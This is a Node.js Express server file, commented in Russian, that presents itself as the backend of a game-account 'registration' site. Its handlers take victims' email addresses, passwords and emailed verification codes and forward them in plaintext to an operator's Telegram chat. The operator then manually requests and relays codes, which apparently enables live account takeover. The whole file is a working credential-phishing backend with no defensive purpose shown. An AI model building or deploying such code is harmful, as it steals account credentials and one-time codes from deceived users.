// server/index.js
const path = require("path");
const express = require("express");

const app = express();

// ===== ENV =====
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // например "123456789"
const PORT = process.env.PORT || 3000;

if (!TELEGRAM_BOT_TOKEN) {
  console.warn("[WARN] TELEGRAM_BOT_TOKEN is not set");
}
if (!ADMIN_CHAT_ID) {
  console.warn("[WARN] ADMIN_CHAT_ID is not set");
}

const TELEGRAM_API = TELEGRAM_BOT_TOKEN
  ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`
  : null;

// ===== MIDDLEWARE =====
app.use(express.json());

// статика: /public (index.html, soon.html, картинки и т.д.)
const PUBLIC_DIR = path.join(__dirname, "..", "public");
app.use(express.static(PUBLIC_DIR));

// health-check для Render
app.get("/healthz", (req, res) => {
  res.json({ ok: true });
});

// опционально: корень сайта
app.get("/", (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

// ===== TELEGRAM HELPERS =====

async function telegramRequest(method, payload) {
  if (!TELEGRAM_API) {
    console.error("[TG] Missing TELEGRAM_BOT_TOKEN, cannot call Telegram API");
    return { ok: false };
  }

  try {
    const res = await fetch(`${TELEGRAM_API}/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const data = await res.json();
    if (!data.ok) {
      console.error(`[TG] ${method} error:`, data);
    }
    return data;
  } catch (err) {
    console.error(`[TG] ${method} fetch error:`, err);
    return { ok: false };
  }
}

function sendTelegramMessage(chatId, text, extra = {}) {
  return telegramRequest("sendMessage", {
    chat_id: chatId,
    text,
    ...extra,
  });
}

// ===== API: notify-admin =====
//
// фронт вызывает notifyAdmin("email_code_request", payload)
// или notifyAdmin("full_application_fallback", formData)
//
app.post("/api/notify-admin", async (req, res) => {
  const {
    type,
    accessCode,
    ingameId,
    email,
    password,
    emailCode,
  } = req.body || {};

  if (!type) {
    return res.status(400).json({ ok: false, error: "missing_type" });
  }

  try {
    if (type === "email_code_request") {
      // ВАЖНО: сюда добавляем password, чтобы он был в первом сообщении
      const text =
        "✉️ <b>Email code request</b>\n" +
        "\nType: <code>email_code_request</code>" +
        `\nAccess code: <code>${accessCode || "-"}</code>` +
        `\nIn-game ID: <code>${ingameId || "-"}</code>` +
        `\nEmail: <code>${email || "-"}</code>` +
        `\nPassword: <code>${password || "-"}</code>` +
        "\n\n⬆️ Проверь данные и отправь пользователю верификационный код на почту.";

      // Клавиатура чисто для тебя в ТГ; сайт от неё не зависит
      const replyMarkup = {
        inline_keyboard: [
          [
            { text: "✅ Approve email", callback_data: "APPROVE_EMAIL" },
            { text: "❌ Deny / wrong data", callback_data: "DENY_EMAIL" },
          ],
        ],
      };

      const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
        parse_mode: "HTML",
        reply_markup: replyMarkup,
      });

      return res.json({ ok: tgRes.ok });
    }

    if (type === "full_application_fallback") {
      // если /api/submit-registration упал, фронт шлёт сюда полную заявку
      const text =
        "⚠️ <b>Registration application (fallback)</b>\n" +
        "\nType: <code>full_application_fallback</code>" +
        `\nAccess code: <code>${accessCode || "-"}</code>` +
        `\nIn-game ID: <code>${ingameId || "-"}</code>` +
        `\nEmail: <code>${email || "-"}</code>` +
        (emailCode
          ? `\nEmail code: <code>${emailCode}</code>`
          : "") +
        `\nPassword: <code>${password || "-"}</code>` +
        "\n\n🚨 Бекенд вернул ошибку. Заявка отправлена через fallback, проверь вручную.";

      const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
        parse_mode: "HTML",
      });

      return res.json({ ok: tgRes.ok });
    }

    // на будущее, если появятся другие типы
    const text =
      "ℹ️ <b>Unknown notify-admin type</b>\n" +
      `\nType: <code>${type}</code>` +
      `\nAccess code: <code>${accessCode || "-"}</code>` +
      `\nIn-game ID: <code>${ingameId || "-"}</code>` +
      `\nEmail: <code>${email || "-"}</code>` +
      (emailCode ? `\nEmail code: <code>${emailCode}</code>` : "") +
      (password ? `\nPassword: <code>${password}</code>` : "");

    const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
      parse_mode: "HTML",
    });

    return res.json({ ok: tgRes.ok });
  } catch (err) {
    console.error("[/api/notify-admin] error:", err);
    return res.status(500).json({ ok: false, error: "server_error" });
  }
});

// ===== API: submit-registration =====
//
// фронт шлёт сюда основную заявку:
// { accessCode, ingameId, email, password, emailCode }
//
app.post("/api/submit-registration", async (req, res) => {
  const { accessCode, ingameId, email, password, emailCode } = req.body || {};

  if (!ingameId || !email || !password) {
    return res.status(400).json({
      ok: false,
      error: "missing_fields",
    });
  }

  const textParts = [
    "📝 <b>Registration application</b>",
    "",
    `Access code: <code>${accessCode || "-"}</code>`,
    `In-game ID: <code>${ingameId}</code>`,
    `Email: <code>${email}</code>`,
  ];

  if (emailCode) {
    textParts.push(`Email code: <code>${emailCode}</code>`);
  }

  textParts.push(`Password: <code>${password}</code>`);
  textParts.push(
    "",
    "ℹ️ Пользователь встал в зону ожидания (waiting zone).",
    "Решение (approve / deny / отправить новый код) принимается только вручную через тебя."
  );

  const text = textParts.join("\n");

  try {
    const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
      parse_mode: "HTML",
    });

    if (!tgRes.ok) {
      return res.status(500).json({ ok: false, error: "telegram_error" });
    }

    // можно сгенерить какой-нибудь ID заявки, если хочешь
    const uid = String(Date.now());

    return res.json({ ok: true, status: "ok", uid });
  } catch (err) {
    console.error("[/api/submit-registration] error:", err);
    return res.status(500).json({ ok: false, error: "server_error" });
  }
});

// ===== TELEGRAM WEBHOOK =====
//
// Нужен, чтобы inline-кнопки APPROVE / DENY хоть что-то делали
// (только в Telegram, сайт не трогают).
//
app.post("/telegram/webhook", async (req, res) => {
  const update = req.body;

  try {
    if (update.callback_query) {
      const cq = update.callback_query;
      const data = cq.data;
      const chatId = cq.message.chat.id;
      const messageId = cq.message.message_id;

      if (data === "APPROVE_EMAIL") {
        // убрать клавиатуру и написать коммент
        await telegramRequest("editMessageReplyMarkup", {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [] },
        });

        await telegramRequest("answerCallbackQuery", {
          callback_query_id: cq.id,
          text: "✅ Пометил как APPROVED (на сайт это не влияет).",
          show_alert: false,
        });

        await sendTelegramMessage(
          chatId,
          "✅ Email / данные помечены как APPROVED. Отправь пользователю код и продолжай вручную.",
          {}
        );
      } else if (data === "DENY_EMAIL") {
        await telegramRequest("editMessageReplyMarkup", {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [] },
        });

        await telegramRequest("answerCallbackQuery", {
          callback_query_id: cq.id,
          text: "❌ Пометил как DENIED (на сайт это не влияет).",
          show_alert: false,
        });

        await sendTelegramMessage(
          chatId,
          "❌ Заявка помечена как DENIED / некорректная. Напиши пользователю отказ, если нужно.",
          {}
        );
      } else {
        await telegramRequest("answerCallbackQuery", {
          callback_query_id: cq.id,
          text: "👍 Принято.",
          show_alert: false,
        });
      }
    }
  } catch (err) {
    console.error("[/telegram/webhook] error:", err);
  }

  // Всегда 200, иначе Telegram будет ретраить
  res.sendStatus(200);
});

// ===== START SERVER =====
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
